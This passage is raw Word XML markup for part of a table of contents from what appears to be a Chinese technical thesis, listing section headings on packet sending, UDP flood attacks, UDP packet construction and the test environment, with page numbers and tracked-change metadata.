          <w:tab/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:instrText xml:space="preserve"> PAGEREF _Toc482522655 \h </w:instrText>
        </w:r>
      </w:ins>
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:webHidden/>
        </w:rPr>
      </w:r>
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:webHidden/>
        </w:rPr>
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:ins w:id="221" w:author="yong li" w:date="2017-05-14T10:54:00Z">
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:t>36</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
        <w:r w:rsidRPr="008E292A">
          <w:rPr>
            <w:rStyle w:val="a8"/>
            <w:noProof/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="1D615B42" w14:textId="2BF3813C" w:rsidR="002C4A81" w:rsidRDefault="002C4A81">
      <w:pPr>
        <w:pStyle w:val="31"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="1680"/>
          <w:tab w:val="right" w:leader="dot" w:pos="8302"/>
        </w:tabs>
        <w:spacing w:before="120" w:after="120"/>
        <w:ind w:left="960"/>
        <w:rPr>
          <w:ins w:id="222" w:author="yong li" w:date="2017-05-14T10:54:00Z"/>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:noProof/>
          <w:sz w:val="21"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="223" w:author="yong li" w:date="2017-05-14T10:54:00Z">
        <w:r w:rsidRPr="008E292A">
          <w:rPr>
            <w:rStyle w:val="a8"/>
            <w:noProof/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidRPr="008E292A">
          <w:rPr>
            <w:rStyle w:val="a8"/>
            <w:noProof/>
          </w:rPr>
          <w:instrText xml:space="preserve"> </w:instrText>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
          </w:rPr>
          <w:instrText>HYPERLINK \l "_Toc482522656"</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5.2.6</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
            <w:noProof/>
            <w:sz w:val="21"/>
            <w:szCs w:val="22"/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r w:rsidRPr="008E292A">
          <w:rPr>
            <w:rStyle w:val="a8"/>
            <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
            <w:b/>
            <w:noProof/>
          </w:rPr>
          <w:t>数据包的发送</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:instrText xml:space="preserve"> PAGEREF _Toc482522656 \h </w:instrText>
        </w:r>
      </w:ins>
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:webHidden/>
        </w:rPr>
      </w:r>
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:webHidden/>
        </w:rPr>
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:ins w:id="224" w:author="yong li" w:date="2017-05-14T10:54:00Z">
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:t>39</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
        <w:r w:rsidRPr="008E292A">
          <w:rPr>
            <w:rStyle w:val="a8"/>
            <w:noProof/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="3AF6A986" w14:textId="4669D78E" w:rsidR="002C4A81" w:rsidRDefault="002C4A81">
      <w:pPr>
        <w:pStyle w:val="21"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="1050"/>
          <w:tab w:val="right" w:leader="dot" w:pos="8302"/>
        </w:tabs>
        <w:spacing w:before="120" w:after="120"/>
        <w:ind w:left="480"/>
        <w:rPr>
          <w:ins w:id="225" w:author="yong li" w:date="2017-05-14T10:54:00Z"/>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:noProof/>
          <w:sz w:val="21"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="226" w:author="yong li" w:date="2017-05-14T10:54:00Z">
        <w:r w:rsidRPr="008E292A">
          <w:rPr>
            <w:rStyle w:val="a8"/>
            <w:noProof/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidRPr="008E292A">
          <w:rPr>
            <w:rStyle w:val="a8"/>
            <w:noProof/>
          </w:rPr>
          <w:instrText xml:space="preserve"> </w:instrText>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
          </w:rPr>
          <w:instrText>HYPERLINK \l "_Toc482522657"</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5.3</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
            <w:noProof/>
            <w:sz w:val="21"/>
            <w:szCs w:val="22"/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r w:rsidRPr="008E292A">
          <w:rPr>
            <w:rStyle w:val="a8"/>
            <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
            <w:b/>
            <w:noProof/>
          </w:rPr>
          <w:t>UDP Flood攻击</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:instrText xml:space="preserve"> PAGEREF _Toc482522657 \h </w:instrText>
        </w:r>
      </w:ins>
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:webHidden/>
        </w:rPr>
      </w:r>
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:webHidden/>
        </w:rPr>
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:ins w:id="227" w:author="yong li" w:date="2017-05-14T10:54:00Z">
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:t>40</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
        <w:r w:rsidRPr="008E292A">
          <w:rPr>
            <w:rStyle w:val="a8"/>
            <w:noProof/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="23D25C83" w14:textId="0B1F826F" w:rsidR="002C4A81" w:rsidRDefault="002C4A81">
      <w:pPr>
        <w:pStyle w:val="31"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="1680"/>
          <w:tab w:val="right" w:leader="dot" w:pos="8302"/>
        </w:tabs>
        <w:spacing w:before="120" w:after="120"/>
        <w:ind w:left="960"/>
        <w:rPr>
          <w:ins w:id="228" w:author="yong li" w:date="2017-05-14T10:54:00Z"/>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:noProof/>
          <w:sz w:val="21"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="229" w:author="yong li" w:date="2017-05-14T10:54:00Z">
        <w:r w:rsidRPr="008E292A">
          <w:rPr>
            <w:rStyle w:val="a8"/>
            <w:noProof/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidRPr="008E292A">
          <w:rPr>
            <w:rStyle w:val="a8"/>
            <w:noProof/>
          </w:rPr>
          <w:instrText xml:space="preserve"> </w:instrText>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
          </w:rPr>
          <w:instrText>HYPERLINK \l "_Toc482522658"</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5.3.1</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
            <w:noProof/>
            <w:sz w:val="21"/>
            <w:szCs w:val="22"/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r w:rsidRPr="008E292A">
          <w:rPr>
            <w:rStyle w:val="a8"/>
            <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
            <w:b/>
            <w:noProof/>
          </w:rPr>
          <w:t>UDP数据包的构建</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:instrText xml:space="preserve"> PAGEREF _Toc482522658 \h </w:instrText>
        </w:r>
      </w:ins>
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:webHidden/>
        </w:rPr>
      </w:r>
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:webHidden/>
        </w:rPr>
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:ins w:id="230" w:author="yong li" w:date="2017-05-14T10:54:00Z">
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:t>40</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
        <w:r w:rsidRPr="008E292A">
          <w:rPr>
            <w:rStyle w:val="a8"/>
            <w:noProof/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="5833D778" w14:textId="7C270EE9" w:rsidR="002C4A81" w:rsidRDefault="002C4A81">
      <w:pPr>
        <w:pStyle w:val="31"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="1680"/>
          <w:tab w:val="right" w:leader="dot" w:pos="8302"/>
        </w:tabs>
        <w:spacing w:before="120" w:after="120"/>
        <w:ind w:left="960"/>
        <w:rPr>
          <w:ins w:id="231" w:author="yong li" w:date="2017-05-14T10:54:00Z"/>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:noProof/>
          <w:sz w:val="21"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="232" w:author="yong li" w:date="2017-05-14T10:54:00Z">
        <w:r w:rsidRPr="008E292A">
          <w:rPr>
            <w:rStyle w:val="a8"/>
            <w:noProof/>
          </w:rPr>
          <w:lastRenderedPageBreak/>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidRPr="008E292A">
          <w:rPr>
            <w:rStyle w:val="a8"/>
            <w:noProof/>
          </w:rPr>
          <w:instrText xml:space="preserve"> </w:instrText>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
          </w:rPr>
          <w:instrText>HYPERLINK \l "_Toc482522659"</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5.3.2</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
            <w:noProof/>
            <w:sz w:val="21"/>
            <w:szCs w:val="22"/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r w:rsidRPr="008E292A">
          <w:rPr>
            <w:rStyle w:val="a8"/>
            <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
            <w:b/>
            <w:noProof/>
          </w:rPr>
          <w:t>UDP数据包的发送</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:instrText xml:space="preserve"> PAGEREF _Toc482522659 \h </w:instrText>
        </w:r>
      </w:ins>
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:webHidden/>
        </w:rPr>
      </w:r>
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:webHidden/>
        </w:rPr>
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:ins w:id="233" w:author="yong li" w:date="2017-05-14T10:54:00Z">
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:t>42</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
        <w:r w:rsidRPr="008E292A">
          <w:rPr>
            <w:rStyle w:val="a8"/>
            <w:noProof/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="57DDF42E" w14:textId="5D552EB2" w:rsidR="002C4A81" w:rsidRDefault="002C4A81">
      <w:pPr>
        <w:pStyle w:val="31"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="1680"/>
          <w:tab w:val="right" w:leader="dot" w:pos="8302"/>
        </w:tabs>
        <w:spacing w:before="120" w:after="120"/>
        <w:ind w:left="960"/>
        <w:rPr>
          <w:ins w:id="234" w:author="yong li" w:date="2017-05-14T10:54:00Z"/>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:noProof/>
          <w:sz w:val="21"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="235" w:author="yong li" w:date="2017-05-14T10:54:00Z">
        <w:r w:rsidRPr="008E292A">
          <w:rPr>
            <w:rStyle w:val="a8"/>
            <w:noProof/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidRPr="008E292A">
          <w:rPr>
            <w:rStyle w:val="a8"/>
            <w:noProof/>
          </w:rPr>
          <w:instrText xml:space="preserve"> </w:instrText>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
          </w:rPr>
          <w:instrText>HYPERLINK \l "_Toc482522660"</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5.3.3</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
            <w:noProof/>
            <w:sz w:val="21"/>
            <w:szCs w:val="22"/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r w:rsidRPr="008E292A">
          <w:rPr>
            <w:rStyle w:val="a8"/>
            <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
            <w:b/>
            <w:noProof/>
          </w:rPr>
          <w:t>UDP Flood攻击</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:instrText xml:space="preserve"> PAGEREF _Toc482522660 \h </w:instrText>
        </w:r>
      </w:ins>
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:webHidden/>
        </w:rPr>
      </w:r>
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:webHidden/>
        </w:rPr>
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:ins w:id="236" w:author="yong li" w:date="2017-05-14T10:54:00Z">
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:t>43</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
        <w:r w:rsidRPr="008E292A">
          <w:rPr>
            <w:rStyle w:val="a8"/>
            <w:noProof/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="78ED5D87" w14:textId="5B8701B3" w:rsidR="002C4A81" w:rsidRDefault="002C4A81">
      <w:pPr>
        <w:pStyle w:val="21"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="1050"/>
          <w:tab w:val="right" w:leader="dot" w:pos="8302"/>
        </w:tabs>
        <w:spacing w:before="120" w:after="120"/>
        <w:ind w:left="480"/>
        <w:rPr>
          <w:ins w:id="237" w:author="yong li" w:date="2017-05-14T10:54:00Z"/>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:noProof/>
          <w:sz w:val="21"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="238" w:author="yong li" w:date="2017-05-14T10:54:00Z">
        <w:r w:rsidRPr="008E292A">
          <w:rPr>
            <w:rStyle w:val="a8"/>
            <w:noProof/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidRPr="008E292A">
          <w:rPr>
            <w:rStyle w:val="a8"/>
            <w:noProof/>
          </w:rPr>
          <w:instrText xml:space="preserve"> </w:instrText>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
          </w:rPr>
          <w:instrText>HYPERLINK \l "_Toc482522661"</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5.4</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
            <w:noProof/>
            <w:sz w:val="21"/>
            <w:szCs w:val="22"/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r w:rsidRPr="008E292A">
          <w:rPr>
            <w:rStyle w:val="a8"/>
            <w:rFonts w:asciiTheme="majorEastAsia" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorEastAsia"/>
            <w:b/>
            <w:noProof/>
          </w:rPr>
          <w:t>本章小结</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:instrText xml:space="preserve"> PAGEREF _Toc482522661 \h </w:instrText>
        </w:r>
      </w:ins>
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:webHidden/>
        </w:rPr>
      </w:r>
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:webHidden/>
        </w:rPr>
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:ins w:id="239" w:author="yong li" w:date="2017-05-14T10:54:00Z">
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:t>43</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
        <w:r w:rsidRPr="008E292A">
          <w:rPr>
            <w:rStyle w:val="a8"/>
            <w:noProof/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="4529F58F" w14:textId="186FE942" w:rsidR="002C4A81" w:rsidRDefault="002C4A81">
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="420"/>
          <w:tab w:val="right" w:leader="dot" w:pos="8302"/>
        </w:tabs>
        <w:spacing w:before="120" w:after="120"/>
        <w:rPr>
          <w:ins w:id="240" w:author="yong li" w:date="2017-05-14T10:54:00Z"/>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:noProof/>
          <w:sz w:val="21"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="241" w:author="yong li" w:date="2017-05-14T10:54:00Z">
        <w:r w:rsidRPr="008E292A">
          <w:rPr>
            <w:rStyle w:val="a8"/>
            <w:noProof/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidRPr="008E292A">
          <w:rPr>
            <w:rStyle w:val="a8"/>
            <w:noProof/>
          </w:rPr>
          <w:instrText xml:space="preserve"> </w:instrText>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
          </w:rPr>
          <w:instrText>HYPERLINK \l "_Toc482522662"</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w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
            <w:noProof/>
            <w:sz w:val="21"/>
            <w:szCs w:val="22"/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r w:rsidRPr="008E292A">
          <w:rPr>
            <w:rStyle w:val="a8"/>
            <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体"/>
            <w:b/>
            <w:noProof/>
          </w:rPr>
          <w:t>环境搭建及测试</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:instrText xml:space="preserve"> PAGEREF _Toc482522662 \h </w:instrText>
        </w:r>
      </w:ins>
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:webHidden/>
        </w:rPr>
      </w:r>
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:webHidden/>
        </w:rPr>
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:ins w:id="242" w:author="yong li" w:date="2017-05-14T10:54:00Z">
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:t>44</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
        <w:r w:rsidRPr="008E292A">
          <w:rPr>
            <w:rStyle w:val="a8"/>
            <w:noProof/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="75BE4FFA" w14:textId="4604B320" w:rsidR="002C4A81" w:rsidRDefault="002C4A81">
      <w:pPr>
        <w:pStyle w:val="21"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="1050"/>
          <w:tab w:val="right" w:leader="dot" w:pos="8302"/>
        </w:tabs>
        <w:spacing w:before="120" w:after="120"/>
        <w:ind w:left="480"/>
        <w:rPr>
          <w:ins w:id="243" w:author="yong li" w:date="2017-05-14T10:54:00Z"/>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:noProof/>
          <w:sz w:val="21"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="244" w:author="yong li" w:date="2017-05-14T10:54:00Z">
        <w:r w:rsidRPr="008E292A">
          <w:rPr>
            <w:rStyle w:val="a8"/>
            <w:noProof/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidRPr="008E292A">
          <w:rPr>
            <w:rStyle w:val="a8"/>
            <w:noProof/>
          </w:rPr>
          <w:instrText xml:space="preserve"> </w:instrText>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
          </w:rPr>
          <w:instrText>HYPERLINK \l "_Toc482522663"</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6.1</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
            <w:noProof/>
            <w:sz w:val="21"/>
            <w:szCs w:val="22"/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r w:rsidRPr="008E292A">
          <w:rPr>
            <w:rStyle w:val="a8"/>
            <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
            <w:b/>
            <w:noProof/>
          </w:rPr>
          <w:t>开发环境</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:instrText xml:space="preserve"> PAGEREF _Toc482522663 \h </w:instrText>
        </w:r>
      </w:ins>
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:webHidden/>
        </w:rPr>
      </w:r>
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:webHidden/>
        </w:rPr>
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:ins w:id="245" w:author="yong li" w:date="2017-05-14T10:54:00Z">
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:t>44</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
        <w:r w:rsidRPr="008E292A">
          <w:rPr>
            <w:rStyle w:val="a8"/>
            <w:noProof/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="210F32A4" w14:textId="39A73D2B" w:rsidR="002C4A81" w:rsidRDefault="002C4A81">
      <w:pPr>
        <w:pStyle w:val="21"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="1050"/>
          <w:tab w:val="right" w:leader="dot" w:pos="8302"/>
        </w:tabs>
        <w:spacing w:before="120" w:after="120"/>
        <w:ind w:left="480"/>
        <w:rPr>
          <w:ins w:id="246" w:author="yong li" w:date="2017-05-14T10:54:00Z"/>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:noProof/>
          <w:sz w:val="21"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="247" w:author="yong li" w:date="2017-05-14T10:54:00Z">
        <w:r w:rsidRPr="008E292A">
          <w:rPr>
            <w:rStyle w:val="a8"/>
            <w:noProof/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidRPr="008E292A">
          <w:rPr>
            <w:rStyle w:val="a8"/>
            <w:noProof/>
          </w:rPr>
          <w:instrText xml:space="preserve"> </w:instrText>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
          </w:rPr>
          <w:instrText>HYPERLINK \l "_Toc482522664"</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6.2</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
            <w:noProof/>
            <w:sz w:val="21"/>
            <w:szCs w:val="22"/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r w:rsidRPr="008E292A">
          <w:rPr>
            <w:rStyle w:val="a8"/>
            <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
            <w:b/>
            <w:noProof/>
          </w:rPr>
          <w:t>测试环境</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r>
          <w:rPr>
